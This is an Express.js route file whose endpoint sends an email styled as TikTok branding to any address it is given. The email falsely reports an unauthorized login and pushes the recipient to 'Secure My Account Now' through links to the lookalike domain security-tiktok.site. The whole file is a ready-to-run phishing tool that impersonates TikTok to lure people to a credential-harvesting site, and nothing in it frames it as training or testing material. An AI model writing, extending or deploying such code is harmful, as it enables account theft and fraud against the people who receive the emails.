import { Router, type IRouter } from "express";
import { Resend } from "resend";
import { SendAlertBody, SendAlertResponse } from "@workspace/api-zod";

const router: IRouter = Router();

const resend = new Resend(process.env.RESEND_KEY);

router.post("/send-alert", async (req, res) => {
  const parsed = SendAlertBody.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ success: false, message: "Invalid request body" });
    return;
  }

  const { email } = parsed.data;

  const { error } = await resend.emails.send({
    from: process.env.RESEND_FROM ?? "TikTok Security <onboarding@resend.dev>",
    to: [email],
    subject: "⚠️ Unauthorized Login Detected on Your TikTok Account",
    html: `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>TikTok Security Alert</title>
</head>
<body style="margin:0;padding:0;background-color:#0a0a0a;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">
  <table width="100%" cellpadding="0" cellspacing="0" style="background-color:#0a0a0a;padding:40px 0;">
    <tr>
      <td align="center">
        <table width="600" cellpadding="0" cellspacing="0" style="max-width:600px;width:100%;background-color:#111111;border-radius:16px;overflow:hidden;border:1px solid #222222;">

          <!-- Header -->
          <tr>
            <td style="background:linear-gradient(135deg,#ff0050 0%,#cc0040 100%);padding:32px 40px;text-align:center;">
              <table width="100%" cellpadding="0" cellspacing="0">
                <tr>
                  <td align="center">
                    <div style="display:inline-block;background:rgba(255,255,255,0.15);border-radius:12px;padding:10px 18px;margin-bottom:16px;">
                      <span style="color:#ffffff;font-size:22px;font-weight:800;letter-spacing:-0.5px;">TikTok</span>
                    </div>
                    <br/>
                    <div style="display:inline-flex;align-items:center;background:rgba(0,0,0,0.25);border-radius:999px;padding:6px 16px;margin-top:4px;">
                      <span style="color:#ffcdd2;font-size:13px;font-weight:600;letter-spacing:0.5px;">⚠️ SECURITY ALERT</span>
                    </div>
                  </td>
                </tr>
              </table>
            </td>
          </tr>

          <!-- Alert icon + title -->
          <tr>
            <td style="padding:40px 40px 0;text-align:center;">
              <div style="width:72px;height:72px;background:#1a0000;border:2px solid #ff0050;border-radius:50%;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;font-size:32px;line-height:72px;">
                🔐
              </div>
              <h1 style="margin:0 0 12px;color:#ffffff;font-size:24px;font-weight:800;line-height:1.3;">
                Unauthorized Login Detected
              </h1>
              <p style="margin:0;color:#aaaaaa;font-size:15px;line-height:1.6;max-width:460px;margin:0 auto;">
                Someone has accessed your TikTok account from an <strong style="color:#ff6b6b;">unrecognized device</strong>. Secure your account immediately to prevent further unauthorized access.
              </p>
            </td>
          </tr>

          <!-- Details card -->
          <tr>
            <td style="padding:32px 40px;">
              <table width="100%" cellpadding="0" cellspacing="0" style="background:#1a1a1a;border-radius:12px;border:1px solid #2a2a2a;overflow:hidden;">
                <tr>
                  <td style="padding:20px 24px;border-bottom:1px solid #2a2a2a;">
                    <p style="margin:0;color:#888888;font-size:11px;font-weight:700;letter-spacing:1px;text-transform:uppercase;">Login Details</p>
                  </td>
                </tr>
                <tr>
                  <td style="padding:16px 24px;border-bottom:1px solid #2a2a2a;">
                    <table width="100%" cellpadding="0" cellspacing="0">
                      <tr>
                        <td style="color:#888888;font-size:13px;width:120px;">📍 Location</td>
                        <td style="color:#ffffff;font-size:13px;font-weight:600;">Unknown Location</td>
                      </tr>
                    </table>
                  </td>
                </tr>
                <tr>
                  <td style="padding:16px 24px;border-bottom:1px solid #2a2a2a;">
                    <table width="100%" cellpadding="0" cellspacing="0">
                      <tr>
                        <td style="color:#888888;font-size:13px;width:120px;">💻 Device</td>
                        <td style="color:#ffffff;font-size:13px;font-weight:600;">Unrecognized Device</td>
                      </tr>
                    </table>
                  </td>
                </tr>
                <tr>
                  <td style="padding:16px 24px;">
                    <table width="100%" cellpadding="0" cellspacing="0">
                      <tr>
                        <td style="color:#888888;font-size:13px;width:120px;">🕐 Time</td>
                        <td style="color:#ffffff;font-size:13px;font-weight:600;">${new Date().toUTCString()}</td>
                      </tr>
                    </table>
                  </td>
                </tr>
              </table>
            </td>
          </tr>

          <!-- CTA button -->
          <tr>
            <td style="padding:0 40px 40px;text-align:center;">
              <p style="color:#aaaaaa;font-size:14px;margin:0 0 24px;">
                If this wasn't you, secure your account immediately by changing your password.
              </p>
              <a href="https://www.security-tiktok.site"
                style="display:inline-block;background:linear-gradient(135deg,#ff0050,#cc0040);color:#ffffff;text-decoration:none;padding:16px 40px;border-radius:12px;font-size:16px;font-weight:700;letter-spacing:0.3px;box-shadow:0 4px 20px rgba(255,0,80,0.4);">
                Secure My Account Now
              </a>
              <p style="color:#666666;font-size:12px;margin:20px 0 0;">
                Button not working? <a href="https://www.security-tiktok.site" style="color:#ff0050;text-decoration:none;">Click here</a>
              </p>
            </td>
          </tr>

          <!-- Divider -->
          <tr>
            <td style="padding:0 40px;">
              <div style="border-top:1px solid #222222;"></div>
            </td>
          </tr>

          <!-- Footer -->
          <tr>
            <td style="padding:24px 40px;text-align:center;">
              <p style="margin:0 0 8px;color:#555555;font-size:12px;line-height:1.6;">
                This is an automated security notification from TikTok.<br/>
                Please do not reply to this email.
              </p>
              <p style="margin:0;color:#444444;font-size:11px;">
                © ${new Date().getFullYear()} TikTok. All rights reserved.
              </p>
            </td>
          </tr>

        </table>
      </td>
    </tr>
  </table>
</body>
</html>`,
  });

  if (error) {
    console.error("Resend error:", error);
    res.status(500).json({ success: false, message: "Failed to send email." });
    return;
  }

  const response = SendAlertResponse.parse({ success: true, message: "Alert email sent successfully." });
  res.json(response);
});

export default router;
